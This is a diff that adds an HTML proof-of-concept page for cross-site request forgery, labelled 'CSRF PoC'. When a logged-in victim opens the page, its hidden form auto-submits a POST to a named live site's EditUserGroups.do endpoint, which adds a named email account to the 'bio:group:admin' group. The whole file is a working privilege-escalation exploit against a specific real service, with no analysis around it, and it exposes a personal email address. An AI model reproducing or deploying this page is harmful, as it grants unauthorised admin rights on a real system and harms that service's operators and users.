@@ -1,0 +1,16 @@
+<html>
+  <!-- CSRF PoC - nb1b3k -->
+  <body>
+    <form id="myForm" action="https://annotator.bii.a-star.edu.sg/annie/EditUserGroups.do" method="POST" enctype="multipart/form-data">
+      <input type="hidden" name="urnparam" value="bio:user:sanjayrana02@mailna.in" />
+      <input type="hidden" name="selectedGroups" value="bio:group:admin" />
+      <input type="hidden" name="addToGroup" value="<<<" />
+      <input type="submit" id="submitButton" value="Submit request" style="display: none;" />
+    </form>
+    <script>
+      document.addEventListener('DOMContentLoaded', function() {
+        document.getElementById('submitButton').click();
+      });
+    </script>
+  </body>
+</html>
